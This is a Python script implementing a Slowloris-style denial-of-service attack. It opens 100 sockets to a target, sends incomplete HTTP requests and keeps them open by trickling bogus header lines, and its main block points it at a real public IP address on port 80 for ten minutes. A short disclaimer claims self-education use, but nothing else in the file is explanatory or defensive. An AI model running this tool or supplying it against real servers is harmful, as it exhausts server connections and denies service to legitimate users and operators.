#! /usr/bin/python3

# A script for DoS attack

"""
CAUTION: THIS SCRIPT SHALL ONLY BE USED FOR PERSONAL PUROPOSES AND SELF-EDUCATION.
I TAKE NO RESPONSIBILITIES FOR ANY UNAUTHORIZED USAGE OF THE SCRIPT.
"""

import socket
import random
import time
import sys


class Dosattack:
    """
    Main class Dosattack. This is be will called on init function.
    """

    def __init__(self, ip_addr, port, socket_count):
        self.ip_addr = ip_addr
        self.port = port
        self.headers = [
            "User-Agent Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
            "Accept-Language: en-us,en;q=0.5",
        ]
        self._sockets = [self.new_socket() for _ in range(socket_count)]

    def get_message(self, message):
        """
        This function will create the msg of HTTP req and encode it to UTF-8.
        """
        return (f"{message} + {random.randint(0, 2000)} HTTP/1.1\r\n").encode("utf-8")

    def new_socket(self):
        """
        This function creates socket and connect it to host ip_addr and port. then
        it sends the req.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.ip_addr, self.port))
            s.send(self.get_message("Get /?"))
            for header in self.headers:
                s.send(bytes(bytes(f"{header}\r\n".encode("utf-8"))))
            return s
        except socket.error as socket_err:
            print(f"Error: {socket_err}")
            time.sleep(0.5)
            return self.new_socket()

    def attack(self, timeout=sys.maxsize, sleep=15):
        """
        This function will start the attack itself. it takes timeout and sleep
        as input.
        """
        t, i = time.time(), 0
        while time.time() - t < timeout:
            for s in self._sockets:
                try:
                    print(f"Sending request #{i}")
                    s.send(self.get_message(message="X-a: "))
                    i = i + 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.new_socket())
                time.sleep(sleep / len(self._sockets))


if __name__ == "__main__":
    dos = Dosattack(ip_addr="8.8.8.8", port=80, socket_count=100)
    dos.attack(60 * 10)
